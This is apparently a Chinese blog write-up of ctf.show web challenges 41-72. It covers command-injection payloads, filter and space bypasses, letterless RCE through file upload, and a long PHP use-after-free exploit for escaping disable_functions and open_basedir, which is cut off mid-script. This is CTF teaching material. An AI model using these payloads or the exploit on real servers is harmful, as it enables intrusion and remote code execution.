<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/131024590">https://blog.csdn.net/Aluxian_/article/details/131024590</a></p>
<p><img src="/../images/image-20240803230741279-172511270290014.png" alt="image-20240803230741279"></p>
<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><p>这题比较考验编码能力，需要自己写脚本</p>
<p>参考wp<a target="_blank" rel="noopener" href="https://wp.ctf.show/d/137-ctfshow-web-web41">https://wp.ctf.show/d/137-ctfshow-web-web41</a></p>
<p><img src="/../images/image-20240804100437365-172511270290015.png" alt="image-20240804100437365"></p>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><p>这里的**&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1**主要意思是不进行回显的意思，可参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tinywan/p/6025468.html">https://www.cnblogs.com/tinywan/p/6025468.html</a></p>
<p>我们要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="comment">//分号</span></span><br><span class="line">|	<span class="comment">//只执行后面那条命令</span></span><br><span class="line">||	<span class="comment">//只执行前面那条命令</span></span><br><span class="line">&amp;	<span class="comment">//两条命令都会执行</span></span><br><span class="line">&amp;&amp;	<span class="comment">//两条命令都会执行</span></span><br></pre></td></tr></table></figure>

<p>payload：cat flag.php;<br>payload: cat flag.php||</p>
<p><img src="/../images/image-20240804101746082-172511270290016.png" alt="image-20240804101746082"></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>在42的基础上增加了正则过滤  只需要换一个读取文件的命令即可</p>
<p>more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep strings</p>
<p><img src="/../images/image-20240804102555828-172511270290017.png" alt="image-20240804102555828"></p>
<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><p>同理 这里多过滤了一个flag 用f*绕过就行</p>
<p><img src="/../images/image-20240804103043310-172511270290018.png" alt="image-20240804103043310"></p>
<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>又过滤一个空格  采用空格绕过就行 </p>
<p><strong>空格绕过</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="string">` `</span>&lt;<span class="string">` `</span>&lt;&gt;<span class="string">` 重定向符</span></span><br><span class="line"><span class="string">`</span><span class="variable">%09</span><span class="string">`(需要php环境)</span></span><br><span class="line"><span class="string">`</span><span class="variable">$&#123;IFS&#125;</span><span class="string">`</span></span><br><span class="line"><span class="string">`</span>$IFS<span class="variable">$9</span><span class="string">`</span></span><br><span class="line"><span class="string">`</span>&#123;cat,flag.php&#125;<span class="string">` //用逗号实现了空格功能</span></span><br><span class="line"><span class="string">`</span><span class="variable">%20</span><span class="string">`</span></span><br><span class="line"><span class="string">`</span><span class="variable">%09</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20240804104607298-172511270290019.png" alt="image-20240804104607298"></p>
<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>这里又过滤了数字 $ *     我们这里可以使用？代替*    空格可以用%09代替（这里不属于数字）</p>
<p><img src="/../images/image-20240804112347014-172511270290021.png" alt="image-20240804112347014"></p>
<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><p>同理 这里又过滤了一些字符 还是相同的方法代替就行</p>
<p><img src="/../images/image-20240804112845028-172511270290022.png" alt="image-20240804112845028"></p>
<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><p>也是又过滤了一些 同理即可</p>
<p><img src="/../images/image-20240804113141034-172511270290020.png" alt="image-20240804113141034"></p>
<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><p>同理</p>
<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>过滤了 % 换一个空格绕过方式 &lt;&gt;                 有个知识点&lt;&gt;和？放在一起不回显  用&#x2F;代替？ 再套用之前的payload就行</p>
<p><img src="/../images/image-20240804113403902-172511270290023.png" alt="image-20240804113403902"></p>
<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>又过滤了tac 换一个读取文件命令 nl 就行 命令分隔用%0a</p>
<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>这里我们还是延续之前的思路进行绕过 但是发现flag回显出来不对</p>
<p>发现flag在根目录下</p>
<p><img src="/../images/image-20240804160113641-172511270290126.png" alt="image-20240804160113641"></p>
<p><img src="/../images/image-20240804160103249-172511270290024.png" alt="image-20240804160103249"></p>
<p><img src="/../images/image-20240804160321341-172511270290025.png" alt="image-20240804160321341"></p>
<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>过滤了cat *等还是之前的思路 换其他的命令代替即可</p>
<p>?c&#x3D;nl${IFS}????.??? </p>
<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>增加很多过滤条件 也是可以进行命令替换</p>
<p>?c&#x3D;uniq${IFS}????.??? </p>
<p>或者</p>
<p>?c&#x3D;grep${IFS}’{‘${IFS}fl???php （在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）</p>
<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p>这道题是无字母rce的命令执行  </p>
<p>这里没有过滤 .这个符号   .的作用可以执行sh命令</p>
<p>所以我们可以上传一个文件再通过.去执行该文件里面的命令从而读取flag</p>
<p>在上传文件时 文件会被保存在&#x2F;tem&#x2F;phpXXXXXX 这后六位字符是随机的</p>
<p>而且一般最后一位是大写的字母 所以我们可以利用通配符去匹配这个文件目录  与正则表达式类似，glob支持利用[0-9]来表示一个范围，所以我们可以用[A-Z]来匹配文件的最后一位，但因为过滤了字母，需要把A改为A的前一位<code>@</code>，把Z改为Z的后一位<code>[</code>来匹配大写字母。<br>那么最终payload为<code>c=. /???/????????[@-[]</code></p>
<p><img src="/../images/image-20240805102542066-172511270290128.png" alt="image-20240805102542066"></p>
<p>所以接下来我们需要先构造一个post请求包进行文件上传</p>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>


<p>上传文件后抓包修改文件内容 查看flag在哪里</p>
<p>知道flag在当前目录 <img src="/../images/image-20240805103706991-172511270290127.png" alt="image-20240805103706991"></p>
<p><img src="/../images/image-20240805103831157-172511270290131.png" alt="image-20240805103831157"></p>
<p>再修改命令读取flag就行</p>
<p><img src="/../images/image-20240805104901871-172511270290129.png" alt="image-20240805104901871"></p>
<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>在55的基础上把数字过滤了 方法与55一致</p>
<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这题明说了flag在36.php里面  但是限制很多 题目自己给我加了.php的后缀 所以我们只需要想办法表示出来36即可</p>
<p>这里用到一个方法是取反   ~表示取反 取反的规则是 ~x+1&#x3D;-x  对0取反得-1  对-37取反得36</p>
<p>所以我们需要表示出来-37       </p>
<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
<p><img src="/../images/1c548e1869cdf3e7f60097658b35d48e-172511270290132.png" alt="img"></p>
<p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
<p><img src="/../images/image-20240805144312844-172511270290130.png" alt="image-20240805144312844"></p>
<h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>从这里开始就是对函数进行禁用</p>
<p> 通过测试发现该类题目是disable_functions绕过，disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。（eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。）</p>
<pre><code>黑名单绕过，难免会有遗漏的函数，我们可以查看phpinfo文件，看看是否有未被禁用的危险函数
（虽然这里连phpinfo都禁用了）
</code></pre>
<p>如：dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</p>
<p><img src="/../images/image-20240820143928434-172511270290133.png" alt="image-20240820143928434"></p>
<p>我们可以多尝试几个php函数绕过即可</p>
<p><img src="/../images/image-20240820144441225-172511270290134.png" alt="image-20240820144441225"></p>
<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>按照之前的思路我们发现回显出来的flag异常</p>
<p>提示我们flag不在这里   那我们可以考虑flag是不是在别的目录下</p>
<p>用scandir查看目录  也可以用print_r函数</p>
<p><img src="/../images/image-20240820163505914-172511270290136.png" alt="image-20240820163505914"></p>
<p>也是在根目录下找到了flag 用之前的思路查看flag</p>
<p><img src="/../images/image-20240820163912683-172511270290135.png" alt="image-20240820163912683"></p>
<p><img src="/../images/image-20240820164030998-172511270290137.png" alt="image-20240820164030998"></p>
<h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>同理</p>
<p>只不过这里禁用了print_r函数</p>
<h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>这里禁用了highlight_file() 导致页面不显示源码了</p>
<p><img src="/../images/image-20240820170841164-172511270290141.png" alt="image-20240820170841164"></p>
<p>不能用highlight换一个函数include包含一下</p>
<p><img src="/../images/image-20240820173156963-172511270290138.png" alt="image-20240820173156963"></p>
<p>发现flag也不再这里 还是找一下目录发现在根目录里面</p>
<p>用include查看一下</p>
<p><img src="/../images/image-20240820173417796-172511270290139.png" alt="image-20240820173417796"></p>
<h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>比上题多过滤var_dump();用var_export()代替</p>
<p><img src="/../images/image-20240822110408393-172511270290140.png" alt="image-20240822110408393"></p>
<p><img src="/../images/image-20240822110646459-172511270290143.png" alt="image-20240822110646459"></p>
<h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p> 过滤 error_reporting()，ini_set();</p>
<p>同上</p>
<p><img src="/../images/image-20240822111959048-172511270290142.png" alt="image-20240822111959048"></p>
<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>查看网页源码  </p>
<p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>先执行$c，然后将结果放在缓冲区，将缓冲区的所有字母和数字替换为?.</p>
<p>可以在执行$c时使用die(),exit()直接退出缓冲区进行输出。</p>
<p> 查看flag.php无返回，继续使用var_export(scandir(‘&#x2F;‘))扫描目录，include读取文件。</p>
<p><img src="/../images/image-20240822112556468-172511270290145.png" alt="image-20240822112556468"></p>
<p><img src="/../images/image-20240822113353328-172511270290144.png" alt="image-20240822113353328"></p>
<p><img src="/../images/image-20240822113431940-172511270290147.png" alt="image-20240822113431940"></p>
<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>这个不大会只是抄了抄wp</p>
<p><img src="/../images/2272328-20211025183839104-656169337-172511270290146.png" alt="image-20211025004503239"></p>
<p>失败了，找不到<code>flag.txt</code>这个文件了，文件扫描走起，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p><img src="/../images/2272328-20211025183838844-831060505-172511270290149.png" alt="image-20211025004715049"></p>
<p>这，忘记了要退出呀</p>
<p><img src="/../images/2272328-20211025183838559-602530486-172511270290148.png" alt="image-20211025004801640"></p>
<p>找不到？？？<code>var_dump</code>没了，换一种写法<code>$a=scandir(&#39;/&#39;);</code></p>
<p><img src="/../images/2272328-20211025183838232-829426134-172511270290151.png" alt="image-20211025005019997">还是不行，回头看一波源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>error_reporting(<span class="number">0</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);<span class="comment">// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123;        $c= $_POST[&#x27;c&#x27;];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;你要上天吗？</span></span><br></pre></td></tr></table></figure>

<p>源码没变呀，回头看报错</p>
<p><img src="/../images/2272328-20211025183837953-1809086257-172511270290150.png" alt="image-20211025005245654"></p>
<p>这里添加了<code>basedir</code>,通过这个来限制你的读取目录，那我们可以使用一些<code>glob</code>协议来绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="string">&quot;glob:///*.txt&quot;</span>; <span class="comment">//定义一个路径，查看根目录下所有的txt文件if($b=opendir($a))&#123; //读入一下  while (($file = readdir($b)) !== false)&#123; //循环读取    echo &quot;filename:&quot;.$file.&quot;\n&quot;; //如果不是目录也是存在的也输出&#125;closedir($b); //关闭&#125;exit(); //防止替换</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/2272328-20211025183837671-857222048-172511270290152.png" alt="image-20211025010152624"></p>
<p>发现根目录下的<code>txt</code>文件只有一个<code>flag0.txt</code>，我们直接包含走起</p>
<p><img src="/../images/2272328-20211025183837411-1750988643-172511270290153.png" alt="image-20211025010429300"></p>
<p>呜呜呜，它不在网站这个目录，在<code>open_dir</code>之外，这时候只能用<code>uaf</code>了</p>
<p>这是一个通用的绕过安全目录的一个脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>function <span class="title function_ invoke__">ctfshow</span>(<span class="variable">$cmd</span>) &#123;    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;        <span class="keyword">public</span> <span class="variable">$a</span>;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;             <span class="keyword">global</span> <span class="variable">$backtrace</span>;             <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();            &#125;        &#125;    &#125;    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;        <span class="variable">$address</span> = <span class="number">0</span>;        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);        &#125;        <span class="keyword">return</span> <span class="variable">$address</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;        &#125;        <span class="keyword">return</span> <span class="variable">$out</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;        <span class="variable">$i</span> = <span class="number">0</span>;        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;        &#125;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;        <span class="keyword">return</span> <span class="variable">$leak</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123;                 <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123;                 <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;            &#125;        &#125;        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)            <span class="keyword">return</span> <span class="literal">false</span>;        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);                                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)                    <span class="keyword">continue</span>;            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);                                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)                    <span class="keyword">continue</span>;            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;        &#125;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;        <span class="variable">$base</span> = <span class="number">0</span>;        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;                <span class="keyword">return</span> <span class="variable">$addr</span>;            &#125;        &#125;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;        <span class="keyword">do</span> &#123;            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);            &#125;            <span class="variable">$addr</span> += <span class="number">0x20</span>;        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);        <span class="keyword">return</span> <span class="literal">false</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;    &#125;    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);    &#125;    <span class="variable">$n_alloc</span> = <span class="number">10</span>;     <span class="variable">$contiguous</span> = [];    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);    &#125;    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);    <span class="title function_ invoke__">write</span>(<span 